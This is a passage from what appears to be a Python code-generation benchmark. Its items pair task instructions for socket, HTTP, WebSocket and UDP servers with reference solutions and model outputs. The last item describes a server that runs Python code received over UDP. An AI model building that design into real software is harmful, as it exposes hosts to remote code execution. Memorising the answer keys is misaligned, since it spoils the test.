    "right_result": "import socketserver\nimport threading\nimport cv2\n\nclass NeuralNetwork:\n    pass\n\nclass ObjectDetection:\n    def detect_objects(self, frame):\n        return []\n\nclass RCControl:\n    def forward(self):\n        print(\"RC car moving forward\")\n\n    def stop(self):\n        print(\"RC car stopping\")\n\nclass DistanceToCamera:\n    def calculate_distance(self, width_in_frame):\n        return 1.0  # Placeholder for actual distance calculation\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        class VideoStreamHandler(socketserver.StreamRequestHandler):\n            def __init__(self, request, client_address, server):\n                self.nn = NeuralNetwork()\n                self.obj_detection = ObjectDetection()\n                self.rc_car = RCControl()\n                self.stop_cascade = cv2.CascadeClassifier('stop_sign.xml')\n                self.light_cascade = cv2.CascadeClassifier('traffic_light.xml')\n                self.d_to_camera = DistanceToCamera()\n                self.d_sensor_thresh = 30\n                self.d_stop_light_thresh = 30\n                self.d_stop_sign = 0.0\n                self.d_light = 0.0\n                self.stop_start = 0\n                self.stop_finish = 0\n                self.stop_time = 0.0\n                self.drive_time_after_stop = 0.0\n                super().__init__(request, client_address, server)\n\n            def handle(self):\n                cap = cv2.VideoCapture(self.rfile)\n                while True:\n                    ret, frame = cap.read()\n                    if not ret:\n                        break\n                    objects = self.obj_detection.detect_objects(frame)\n                    for obj in objects:\n                        if obj == 'stop_sign':\n                            self.d_stop_sign = self.d_to_camera.calculate_distance(50)  # Example width\n                            if self.d_stop_sign < self.d_stop_light_thresh:\n                                self.stop_start = cv2.getTickCount()\n                                self.rc_car.stop()\n                                while global_sensor_data['distance'] < self.d_sensor_thresh:\n                                    pass\n                                self.stop_finish = cv2.getTickCount()\n                                self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                                self.drive_time_after_stop = 0.0\n                        elif obj == 'traffic_light':\n                            self.d_light = self.d_to_camera.calculate_distance(60)  # Example width\n                            if self.d_light < self.d_stop_light_thresh:\n                                self.rc_car.stop()\n                    if self.drive_time_after_stop > 10.0:\n                        self.rc_car.forward()\n                    self.drive_time_after_stop += 0.1  # Simulated time increment\n                    cv2.imshow('Frame', frame)\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        break\n                cap.release()\n                cv2.destroyAllWindows()\n\n        with socketserver.TCPServer((host, port), VideoStreamHandler) as server:\n            server.serve_forever()\n\n    def sensor_stream(self, host, port):\n        class SensorDataHandler(socketserver.BaseRequestHandler):\n            def handle(self):\n                global global_sensor_data\n                while True:\n                    data = self.request.recv(1024)\n                    if not data:\n                        break\n                    sensor_data = data.decode().strip().split(',')\n                    global_sensor_data = {\n                        'distance': int(sensor_data[0]),\n                        'speed': float(sensor_data[1]),\n                        'angle': float(sensor_data[2])\n                    }\n                    print(f\"Received sensor data: {global_sensor_data}\")\n\n        with socketserver.TCPServer((host, port), SensorDataHandler) as server:\n            server.serve_forever()\n\n    def start(self):\n        global global_sensor_data\n        global_sensor_data = {'distance': 100, 'speed': 0.0, 'angle': 0.0}\n\n        video_thread = threading.Thread(target=self.video_stream, args=(self.host, self.port1))\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n\n        sensor_thread.daemon = True\n\n        video_thread.start()\n        sensor_thread.start()\n\n        video_thread.join()"
  },
  {
    "Task_id": 41,
    "Instruction": "Task Description: Create a Python class that implements an asynchronous HTTP client for interacting with a REST API, supporting PUT and GET operations for question-answer pairs.\n\nClass Description: The Client class provides asynchronous HTTP communication capabilities using httpx and asyncio. It handles JSON data exchange with a REST API endpoint, allowing storage (PUT) and retrieval (GET) of question-answer pairs.\n\nAttributes:\n_uri: str - The base URI of the REST API endpoint (default: \"http://localhost:8000\")\n_CLIENT_HEADER: dict - Static dictionary containing HTTP headers for JSON content type\n\nMethods:\n_put: async (question: str, answer: str) -> int - Internal async method that sends a question-answer pair to the API via POST request. Returns HTTP status code.\n_get: async (question: str) -> str - Internal async method that retrieves an answer for a given question via POST request. Returns the answer string or None.\nput: (question: str, answer: str) -> int - Synchronous wrapper for _put that runs the async operation. Returns HTTP status code.\nget: (question: str) -> str - Synchronous wrapper for _get that runs the async operation. Returns the answer string or None.",
    "Canonical_solution": "import asyncio\nimport json\nimport httpx\n\n_CLIENT_HEADER = {\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"}\n\nclass Client:\n    def __init__(self, uri: str = \"http://localhost:8000\"):\n        self._uri = uri\n\n    async def _put(self, question: str, answer: str):\n        async with httpx.AsyncClient() as client:\n            data = {\n                \"prompt\": question,\n                \"answer\": answer,\n            }\n            response = await client.post(\n                f\"{self._uri}/put\", headers=_CLIENT_HEADER, data=json.dumps(data)\n            )\n        return response.status_code\n\n    async def _get(self, question: str):\n        async with httpx.AsyncClient() as client:\n            data = {\n                \"prompt\": question,\n            }\n            response = await client.post(\n                f\"{self._uri}/get\", headers=_CLIENT_HEADER, data=json.dumps(data)\n            )\n        return response.json().get(\"answer\")\n\n    def put(self, question: str, answer: str):\n        return asyncio.run(self._put(question, answer))\n\n    def get(self, question: str):\n        return asyncio.run(self._get(question))",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "import asyncio\nimport httpx\n\nclass Client:\n    _uri: str = \"http://localhost:8000\"\n    _CLIENT_HEADER = {\"Content-Type\": \"application/json\"}\n\n    def __init__(self):\n        pass\n\n    async def _put(self, question: str, answer: str) -> int:\n        async with httpx.AsyncClient() as client:\n            response = await client.post(\n                f\"{self._uri}/put\",\n                json={\"question\": question, \"answer\": answer},\n                headers=self._CLIENT_HEADER\n            )\n            return response.status_code\n\n    async def _get(self, question: str) -> str:\n        async with httpx.AsyncClient() as client:\n            response = await client.post(\n                f\"{self._uri}/get\",\n                json={\"question\": question},\n                headers=self._CLIENT_HEADER\n            )\n            if response.status_code == 200:\n                return response.json().get(\"answer\")\n            return None\n\n    def put(self, question: str, answer: str) -> int:\n        return asyncio.run(self._put(question, answer))\n\n    def get(self, question: str) -> str:\n        return asyncio.run(self._get(question))"
  },
  {
    "Task_id": 412,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client connections and process incoming messages asynchronously.\n\nClass Description: The solution consists of two classes: ReceiveMsgSocketServer (a request handler) and SocketServerManager (a server manager). The handler processes incoming messages and the manager controls server lifecycle.\n\nAttributes:\n\nport: int - The port number on which the server will listen\nrequest_handler: class - The handler class for processing client requests\nserver: socketserver.ThreadingTCPServer - The TCP server instance\nserver_thread: threading.Thread - The thread running the server (when not in main thread)\n\nMethods:\n\nReceiveMsgSocketServer.handle() -> None - Processes client requests, receives messages, and sends responses\nReceiveMsgSocketServer.msg_callback(msg: dict) -> None - Static method to handle received messages (default prints messages)\nSocketServerManager.start_server(main_thread: bool = True) -> int or None - Starts the server, returns thread ID if not in main thread\nSocketServerManager.stop_server() -> None - Stops the server and cleans up resources",
    "Canonical_solution": "import ctypes\nimport json\nimport socketserver\nimport threading\n\nclass ReceiveMsgSocketServer(socketserver.BaseRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        conn = self.request\n        while True:\n            try:\n                ptr_data = b\"\"\n                while True:\n                    data = conn.recv(1024)\n                    ptr_data += data\n                    if len(data) == 0 or data[-1] == 0xA:\n                        break\n                msg = json.loads(ptr_data.decode('utf-8'))\n                ReceiveMsgSocketServer.msg_callback(msg)\n            except OSError:\n                break\n            except json.JSONDecodeError:\n                pass\n            conn.sendall(\"200 OK\".encode())\n        conn.close()\n\n    @staticmethod\n    def msg_callback(msg):\n        print(msg)\n\nclass SocketServerManager:\n    def __init__(self, port: int = 10808, request_handler=ReceiveMsgSocketServer):\n        self.port = port\n        self.request_handler = request_handler\n        self.server = None\n        self.server_thread = None\n\n    def start_server(self, main_thread: bool = True) -> int or None:\n        ip_port = (\"127.0.0.1\", self.port)\n        try:\n            self.server = socketserver.ThreadingTCPServer(ip_port, self.request_handler)\n            if main_thread:\n                self.server.serve_forever()\n            else:\n                self.server_thread = threading.Thread(target=self.server.serve_forever)\n                self.server_thread.setDaemon(True)\n                self.server_thread.start()\n                return self.server_thread.ident\n        except KeyboardInterrupt:\n            pass\n        except Exception as e:\n            print(e)\n        return None\n\n    def stop_server(self):\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport threading\nimport json\n\nclass ReceiveMsgSocketServer(socketserver.BaseRequestHandler):\n    def handle(self):\n        try:\n            data = self.request.recv(1024).strip()\n            if data:\n                msg = json.loads(data.decode('utf-8'))\n                self.msg_callback(msg)\n                response = json.dumps({\"status\": \"received\"}).encode('utf-8')\n                self.request.sendall(response)\n        except Exception as e:\n            print(f\"Error handling request: {e}\")\n\n    @staticmethod\n    def msg_callback(msg: dict) -> None:\n        print(f\"Received message: {msg}\")\n\nclass SocketServerManager:\n    def __init__(self, port: int):\n        self.port = port\n        self.server = None\n        self.server_thread = None\n\n    def start_server(self, main_thread: bool = True) -> int or None:\n        try:\n            self.server = socketserver.ThreadingTCPServer(('0.0.0.0', self.port), ReceiveMsgSocketServer)\n            if main_thread:\n                self.server.serve_forever()\n            else:\n                self.server_thread = threading.Thread(target=self.server.serve_forever)\n                self.server_thread.daemon = True\n                self.server_thread.start()\n                return self.server_thread.ident\n        except Exception as e:\n            print(f\"Error starting server: {e}\")\n            return None\n\n    def stop_server(self) -> None:\n        if self.server:\n            self.server.shutdown()\n            self.server.server_close()\n            self.server = None\n        if self.server_thread and self.server_thread.is_alive():\n            self.server_thread.join()"
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle incoming client connections, process JSON messages, and interact with a WeChat robot COM object for message processing and user information retrieval.\n\nClass Description: ReceiveMsgBaseServer is a custom request handler class that inherits from socketserver.BaseRequestHandler. It handles client connections, processes incoming JSON messages, and interacts with a WeChat robot COM object to enrich message data with user information.\n\nAttributes:\n- None (This class doesn't maintain persistent attributes beyond the inherited ones from BaseRequestHandler)\n\nMethods:\n- __init__(*args, **kwargs) -> None - Initializes the base request handler\n- handle() -> None - Main method that processes client connections, receives and parses JSON messages, and calls the message callback\n- msg_callback(msg: dict) -> None - Static method that processes the received message by interacting with WeChat robot COM objects to enrich message data with user information\n\nFunction Description: start_socket_server creates and starts a threaded TCP server that uses the ReceiveMsgBaseServer handler to process client connections.\n\nInput:\n- port: int (default=10808) - The port number to bind the server to\n- request_handler: class (default=ReceiveMsgBaseServer) - The request handler class to use\n- main_thread: bool (default=True) - Whether to run the server in the main thread or a daemon thread\n\nOutput:\n- int or None - Returns the thread identifier if main_thread=False, otherwise None (runs forever in main thread)",
    "Canonical_solution": "import socketserver\nimport threading\nimport comtypes\nimport json\n\nclass ReceiveMsgBaseServer(socketserver.BaseRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        conn = self.request\n        comtypes.CoInitialize()\n        while True:\n            try:\n                ptr_data = b\"\"\n                while True:\n                    data = conn.recv(1024)\n                    ptr_data += data\n                    if len(data) == 0 or data[-1] == 0xA:\n                        break\n                msg = json.loads(ptr_data.decode('utf-8'))\n                ReceiveMsgBaseServer.msg_callback(msg)\n            except OSError:\n                break\n            except json.JSONDecodeError:\n                pass\n            conn.sendall(\"200 OK\".encode())\n        conn.close()\n        comtypes.CoUninitialize()\n\n    @staticmethod\n    def msg_callback(msg):\n        robot = comtypes.client.CreateObject(\"WeChatRobot.CWeChatRobot\")\n        event = comtypes.client.CreateObject(\"WeChatRobot.RobotEvent\")\n        wx = WeChatRobot(msg['pid'], robot, event)\n        userinfo = wx.GetWxUserInfo(msg['wxid'])\n        msg['alias'] = userinfo['wxNumber']\n        if msg['isSendMsg'] == 0:\n            if '@chatroom' in msg['sender']:\n                chatroom_info = wx.GetWxUserInfo(msg['sender'])\n                msg['chatroom_name'] = chatroom_info['wxNickName']\n                msg['nickname'] = wx.GetChatRoomMemberNickname(msg['sender'], msg['wxid'])\n            else:\n                msg['nickname'] = userinfo['wxNickName']\n        print(msg)\n        robot.Release()\n        event.Release()\n\ndef start_socket_server(port: int = 10808,\n                       request_handler: 'ReceiveMsgBaseServer' = ReceiveMsgBaseServer,\n                       main_thread=True) -> int or None:\n    ip_port = (\"127.0.0.1\", port)\n    try:\n        s = socketserver.ThreadingTCPServer(ip_port, request_handler)\n        if main_thread:\n            s.serve_forever()\n        else:\n            socket_server = threading.Thread(target=s.serve_forever)\n            socket_server.setDaemon(True)\n            socket_server.start()\n            return socket_server.ident\n    except KeyboardInterrupt:\n        pass\n    except Exception as e:\n        print(e)\n    return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport json\nimport threading\nimport pythoncom\nfrom win32com.client import Dispatch\n\nclass ReceiveMsgBaseServer(socketserver.BaseRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        try:\n            data = self.request.recv(65535)\n            if data:\n                msg = json.loads(data.decode('utf-8'))\n                ReceiveMsgBaseServer.msg_callback(msg)\n        except Exception as e:\n            print(f\"Error handling request: {e}\")\n\n    @staticmethod\n    def msg_callback(msg: dict) -> None:\n        try:\n            pythoncom.CoInitialize()\n            wx_rob = Dispatch(\"WeChatRobot.Robot\")\n            \n            # Get user nickname\n            user_nickname = wx_rob.GetUserInfo(msg.get(\"wxid\", \"\"), 0)\n            \n            # Get message sender's nickname\n            sender_nickname = wx_rob.GetUserInfo(msg.get(\"sender\", \"\"), 0)\n            \n            # Update message with additional info\n            msg.update({\n                \"user_nickname\": user_nickname,\n                \"sender_nickname\": sender_nickname\n            })\n            \n            print(json.dumps(msg, ensure_ascii=False, indent=2))\n            \n        except Exception as e:\n            print(f\"WeChat COM error: {e}\")\n        finally:\n            pythoncom.CoUninitialize()\n\ndef start_socket_server(port: int = 10808, request_handler=ReceiveMsgBaseServer, main_thread: bool = True) -> None or int:\n    server = socketserver.ThreadingTCPServer(('0.0.0.0', port), request_handler)\n    \n    if main_thread:\n        server.serve_forever()\n        return None\n    else:\n        thread = threading.Thread(target=server.serve_forever)\n        thread.daemon = True\n        thread.start()\n        return thread.ident"
  },
  {
    "Task_id": 415,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client requests with proper data framing and error handling.\n\nClass Description: TCPRequestHandler is a custom request handler class that inherits from socketserver.BaseRequestHandler. It handles TCP client connections by implementing methods to receive and send framed data, and processes client requests in the handle() method.\n\nAttributes:\n- request: [socket.socket] - The client connection socket object inherited from BaseRequestHandler\n- client_address: [tuple] - The client address (host, port) inherited from BaseRequestHandler\n- server: [socketserver.BaseServer] - The server instance inherited from BaseRequestHandler\n\nMethods:\n- get_data() -> bytes - Receives and validates framed data from the client. The data is expected to be prefixed with a 2-byte big-endian size field.\n  Input: None\n  Output: bytes - The received payload data (without size prefix)\n  \n- send_data(data: bytes) -> None - Sends framed data to the client by prefixing the payload with a 2-byte big-endian size field.\n  Input: data [bytes] - The payload data to send\n  Output: None\n  \n- handle() -> None - Main request handling method that coordinates receiving and processing client data.\n  Input: None\n  Output: None\n\nClass Description: DNSServer is a server management class that creates and manages TCP/UDP server instances for handling DNS requests.\n\nAttributes:\n- port: [int] - The port number to listen on (default: 53)\n- use_tcp: [bool] - Flag to enable TCP server (default: True)\n- use_udp: [bool] - Flag to enable UDP server (default: False)\n- servers: [list] - List of active server instances\n\nMethods:\n- __init__(port: int = 53, use_tcp: bool = True, use_udp: bool = False) -> None - Initializes the server configuration.\n  Input: \n    port [int] - Server port number\n    use_tcp [bool] - Enable TCP server\n    use_udp [bool] - Enable UDP server\n  Output: None\n  \n- start() -> None - Starts the configured servers in separate threads.\n  Input: None\n  Output: None\n  \n- shutdown() -> None - Shuts down all running server instances.\n  Input: None\n  Output: None",
    "Canonical_solution": "import socketserver\nimport struct\nimport threading\n\nclass TCPRequestHandler(socketserver.BaseRequestHandler):\n    def get_data(self):\n        data = self.request.recv(8192).strip()\n        sz = struct.unpack('>H', data[:2])[0]\n        if sz < len(data) - 2:\n            raise Exception(\"Wrong size of TCP packet\")\n        elif sz > len(data) - 2:\n            raise Exception(\"Too big TCP packet\")\n        return data[2:]\n\n    def send_data(self, data):\n        sz = struct.pack('>H', len(data))\n        return self.request.sendall(sz + data)\n\n    def handle(self):\n        try:\n            data = self.get_data()\n            self.send_data(dns_response(data))\n        except Exception:\n            pass\n\nclass DNSServer:\n    def __init__(self, port=53, use_tcp=True, use_udp=False):\n        self.port = port\n        self.use_tcp = use_tcp\n        self.use_udp = use_udp\n        self.servers = []\n\n    def start(self):\n        if self.use_tcp:\n            self.servers.append(socketserver.ThreadingTCPServer(('', self.port), TCPRequestHandler))\n        if self.use_udp:\n            self.servers.append(socketserver.ThreadingUDPServer(('', self.port), UDPRequestHandler))\n\n        for s in self.servers:\n            thread = threading.Thread(target=s.serve_forever)\n            thread.daemon = True\n            thread.start()\n\n    def shutdown(self):\n        for s in self.servers:\n            s.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport threading\nimport struct\n\nclass TCPRequestHandler(socketserver.BaseRequestHandler):\n    def get_data(self) -> bytes:\n        try:\n            size_data = self.request.recv(2)\n            if not size_data:\n                return b''\n            size = struct.unpack('!H', size_data)[0]\n            data = b''\n            while len(data) < size:\n                chunk = self.request.recv(size - len(data))\n                if not chunk:\n                    return b''\n                data += chunk\n            return data\n        except (struct.error, OSError):\n            return b''\n\n    def send_data(self, data: bytes) -> None:\n        try:\n            size = struct.pack('!H', len(data))\n            self.request.sendall(size + data)\n        except OSError:\n            pass\n\n    def handle(self) -> None:\n        try:\n            data = self.get_data()\n            if data:\n                response = self.handle_request(data)\n                self.send_data(response)\n        except Exception:\n            pass\n\n    def handle_request(self, data: bytes) -> bytes:\n        return b''\n\nclass DNSServer:\n    def __init__(self, port: int = 53, use_tcp: bool = True, use_udp: bool = False) -> None:\n        self.port = port\n        self.use_tcp = use_tcp\n        self.use_udp = use_udp\n        self.servers = []\n\n    def start(self) -> None:\n        if self.use_tcp:\n            tcp_server = socketserver.ThreadingTCPServer(('0.0.0.0', self.port), TCPRequestHandler)\n            tcp_thread = threading.Thread(target=tcp_server.serve_forever)\n            tcp_thread.daemon = True\n            self.servers.append(tcp_server)\n            tcp_thread.start()\n\n        if self.use_udp:\n            udp_server = socketserver.ThreadingUDPServer(('0.0.0.0', self.port), TCPRequestHandler)\n            udp_thread = threading.Thread(target=udp_server.serve_forever)\n            udp_thread.daemon = True\n            self.servers.append(udp_server)\n            udp_thread.start()\n\n    def shutdown(self) -> None:\n        for server in self.servers:\n            server.shutdown()\n            server.server_close()"
  },
  {
    "Task_id": 416,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client connections and echo back received messages.\n\nClass Description: The solution consists of two classes: EchoHandler for processing client requests and TCPServerWrapper for managing the TCP server instance.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' for all interfaces)\n- port: int - The port number to listen on (default: 20000)\n- server: TCPServer - The TCP server instance created with specified host and port\n\nMethods:\n- EchoHandler.handle() -> None - Processes client requests by continuously receiving messages and echoing them back until connection is closed\n- TCPServerWrapper.__init__(host: str = '', port: int = 20000) -> None - Initializes the TCP server with given host and port\n- TCPServerWrapper.serve_forever() -> None - Starts the server and keeps it running indefinitely while printing status information",
    "Canonical_solution": "from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        while True:\n            msg = self.request.recv(8192)\n            if not msg:\n                break\n            self.request.send(msg)\n\nclass TCPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f'Echo server running on port {self.port}')\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\n\nclass EchoHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            self.request.sendall(data)\n\nclass TCPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = socketserver.TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f\"Server started on {self.host}:{self.port}\")\n        try:\n            self.server.serve_forever()\n        except KeyboardInterrupt:\n            print(\"\\nShutting down server\")"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Create a TCP server using Python's socketserver module that echoes back any received messages to the client.\n\nClass Description: The implementation consists of two classes: EchoHandler for handling client connections and EchoServer for managing the TCP server. The EchoHandler processes incoming messages and sends them back, while EchoServer initializes and runs the server.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' for all interfaces)\n- port: int - The port number to listen on (default: 20000)\n- server: TCPServer - The TCP server instance created with the specified host and port\n\nMethods:\n- EchoHandler.handle() -> None - Handles client connections by continuously receiving messages and echoing them back until the connection is closed\n- EchoServer.__init__(host: str = '', port: int = 20000) -> None - Initializes the server with the given host and port\n- EchoServer.serve_forever() -> None - Starts the server and keeps it running indefinitely while printing a status message",
    "Canonical_solution": "from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        while True:\n            msg = self.request.recv(8192)\n            if not msg:\n                break\n            self.request.send(msg)\n\nclass EchoServer:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f'Echo server running on port {self.port}')\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\n\nclass EchoHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            self.request.sendall(data)\n\nclass EchoServer:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = socketserver.TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f\"Echo server running on {self.host}:{self.port}\")\n        self.server.serve_forever()"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Implement a TCP server using Twisted framework in Python that supports WebSocket connections, handles incoming data, and manages connection lifecycle events.\n\nClass Description: The solution consists of two classes: `HelloServerProtocol` (handles protocol-level operations) and `HelloServerFactory` (manages server configuration and startup).\n\nAttributes:\n\n- `HelloServerProtocol`:\n  - transport: [object] - Twisted transport object representing the connection\n- `HelloServerFactory`:\n  - host: [str] - Server host address (default: \"127.0.0.1\")\n  - port: [int] - Server port number (default: 9000)\n  - wrappedFactory: [object] - Twisted Factory instance for protocol handling\n  - factory: [object] - WebSocket-wrapped factory instance\n\nMethods:\n\n- `HelloServerProtocol`:\n  - connectionMade() -> None - Called when a new connection is established\n  - dataReceived(data: bytes) -> None - Called when data is received from client\n- `HelloServerFactory`:\n  - __init__(host: str = \"127.0.0.1\", port: int = 9000, enableCompression: bool = False, autoFragmentSize: int = 1024) -> None - Initializes factory with configuration\n  - start() -> None - Starts the TCP server and enters event loop",
    "Canonical_solution": "from twisted.internet.protocol import Protocol, Factory\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WrappingWebSocketServerFactory\n\nclass HelloServerProtocol(Protocol):\n    def connectionMade(self):\n        print(\"connectionMade\", self.transport.getHost(), self.transport.getPeer())\n        self.transport.write('how are you?' * 100)\n\n    def dataReceived(self, data):\n        print(\"dataReceived: {}\".format(data))\n\nclass HelloServerFactory:\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.wrappedFactory = Factory.forProtocol(HelloServerProtocol)\n        self.factory = WrappingWebSocketServerFactory(\n            self.wrappedFactory,\n            f\"ws://{self.host}:{self.port}\",\n            enableCompression=enableCompression,\n            autoFragmentSize=autoFragmentSize\n        )\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 68,
    "right_result": "from twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol, listenWS\n\nclass HelloServerProtocol(WebSocketServerProtocol):\n    def connectionMade(self):\n        super().connectionMade()\n\n    def dataReceived(self, data):\n        self.transport.write(data)\n\nclass HelloServerFactory:\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.wrappedFactory = WebSocketServerFactory()\n        self.wrappedFactory.protocol = HelloServerProtocol\n        if enableCompression:\n            self.wrappedFactory.setProtocolOptions(perMessageCompression=True)\n        self.wrappedFactory.setProtocolOptions(autoFragmentSize=autoFragmentSize)\n        self.factory = self.wrappedFactory\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        reactor.run()"
  },
  {
    "Task_id": 42,
    "Instruction": "Task Description: Create an asynchronous function to send HTTP POST requests using httpx library in Python, handling JSON data and potential errors.\n\nFunction Description: The function sends an asynchronous HTTP POST request to a specified URL with JSON data, optional headers, and timeout settings. It automatically raises exceptions for non-success status codes and returns the parsed JSON response.\n\nInput:\n- url: str - The target URL for the POST request\n- data: dict - The JSON data to be sent in the request body\n- headers: dict (optional) - Additional HTTP headers to include (default: empty dict)\n- timeout: int | None (optional) - Request timeout in seconds (default: None)\n\nOutput:\n- dict - Parsed JSON response from the server if the request is successful\n- Raises httpx.HTTPStatusError if the response status code indicates an error (4xx or 5xx)",
    "Canonical_solution": "import json\nimport httpx\n\nasync def a_send_post_request(\n    url: str, data: dict, headers: dict = {}, timeout: int | None = None\n):\n    async with httpx.AsyncClient() as client:\n        response = await client.post(url, json=data, headers=headers, timeout=timeout)\n        response.raise_for_status()\n        return response.json()",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import Dict, Optional, Any\n\nasync def post_request(url: str, data: Dict[str, Any], headers: Optional[Dict[str, str]] = None, timeout: Optional[int] = None) -> Dict[str, Any]:\n    async with httpx.AsyncClient() as client:\n        response = await client.post(url, json=data, headers=headers or {}, timeout=timeout)\n        response.raise_for_status()\n        return response.json()"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Implement a UDP server in Python using the socketserver module to handle client requests and send responses.\n\nClass Description: The solution consists of two classes: TimeHandler (request handler) and UDPServerWrapper (server wrapper). TimeHandler processes incoming UDP requests and sends back the current time, while UDPServerWrapper manages the UDP server lifecycle.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' - all interfaces)\n- port: int - The port number to bind the server to (default: 20000)\n- server: UDPServer - The UDP server instance created with the specified host and port\n\nMethods:\n- __init__(host: str = '', port: int = 20000) -> None - Initializes the UDPServerWrapper with host and port, creates a UDPServer instance with TimeHandler\n- serve_forever() -> None - Starts the UDP server and keeps it running indefinitely to handle incoming requests\n\nThe TimeHandler class (inherits from BaseRequestHandler) contains:\n- handle() -> None - Processes each incoming request, prints client info, gets current time, and sends response back to client",
    "Canonical_solution": "from socketserver import BaseRequestHandler, UDPServer\nimport time\n\nclass TimeHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        msg, sock = self.request\n        resp = time.ctime()\n        sock.sendto(resp.encode('ascii'), self.client_address)\n\nclass UDPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = UDPServer((self.host, self.port), TimeHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 72,
    "right_result": "import socketserver\nfrom datetime import datetime\n\nclass TimeHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data, socket = self.request\n        print(f\"Connection from {self.client_address}\")\n        current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        socket.sendto(current_time.encode(), self.client_address)\n\nclass UDPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = socketserver.UDPServer((self.host, self.port), TimeHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()"
  },
  {
    "Task_id": 421,
    "Instruction": "Task Description: Create a UDP server using Twisted framework in Python that integrates with Mayavi for processing and executing received commands to manipulate 3D visualizations.\n\nClass Description: The implementation consists of two classes: M2UDP (a custom UDP protocol handler) and MayaviUDPServer (the main server class). The system receives UDP datagrams containing Python commands, executes them in a Mayavi visualization context, and renders the results.\n\nAttributes:\n\nengine: [object] - The Mayavi engine instance for visualization control\nmlab: [module] - The Mayavi mlab module for 3D visualization\nport: [int] - The UDP port number to listen on\nlogto: [file object] - Where to direct logging output\nscene: [object] - The current Mayavi scene (initialized from engine)\nproto: [M2UDP] - The protocol handler instance\n\nMethods:\n\nM2UDP.__init__: [__init__(engine=None, mlab=None)] -> [None] - Initializes the UDP protocol handler with Mayavi engine and mlab references\nM2UDP.datagramReceived: [datagramReceived(data, host_port)] -> [None] - Handles incoming UDP datagrams, executes contained Python code in Mayavi context, and triggers scene rendering\nMayaviUDPServer.__init__: [__init__(engine=None, port=9007, logto=sys.stdout)] -> [None] - Initializes the server with Mayavi engine, port configuration, and logging setup\nMayaviUDPServer.serve: [serve()] -> [None] - Starts the UDP server, binds the protocol handler, and runs the reactor loop",
